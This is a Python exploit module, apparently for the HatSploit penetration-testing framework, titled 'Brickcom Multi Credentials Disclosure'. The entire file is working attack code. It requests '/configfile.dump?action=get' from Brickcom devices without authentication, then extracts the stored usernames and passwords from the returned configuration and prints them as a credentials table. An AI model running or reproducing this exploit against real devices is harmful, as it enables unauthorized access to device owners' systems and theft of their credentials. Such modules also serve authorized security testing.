"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.module.basic import *
from hatsploit.lib.module.proto import HTTP


class HatSploitModule(Module, HTTP):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Category': "exploit",
            'Name': "Brickcom Multi Credentials Disclosure",
            'Module': "exploit/linux/brickcom/multi_credentials_disclosure",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
                'Orwelllabs - vulnerability researcher',
            ],
            'Description': "Brickcom multiple devices credentials disclosure.",
            'Platform': OS_LINUX,
            'Rank': "high",
        })

    def check(self):
        response = self.http_request(
            method="GET",
            path='/configfile.dump?action=get',
        )

        if not response or response.status_code != 200:
            return False

        return True

    def run(self):
        response = self.http_request(
            method="GET",
            path='/configfile.dump?action=get',
        )

        creds = []
        usernames = []
        passwords = []

        try:
            for config in response.text.split('\n'):
                variable = config.split('=')[0]

                if len(config.split('=')) >= 2:
                    value = config.split('=')[1]

                    if 'UserSetSetting.userList.users' in variable:
                        if 'password' in variable:
                            if value:
                                passwords.append(value)
                        elif 'username' in variable:
                            if value:
                                usernames.append(value)

            count = len(usernames)
            for index in range(count):
                creds.append((usernames[index], passwords[index]))

            if creds:
                self.print_table("Credentials", ('Username', 'Password'), *creds)
            else:
                self.print_warning("Target vulnerable, but no credentials found.")
        except Exception:
            self.print_warning("Target vulnerable, but no credentials found.")
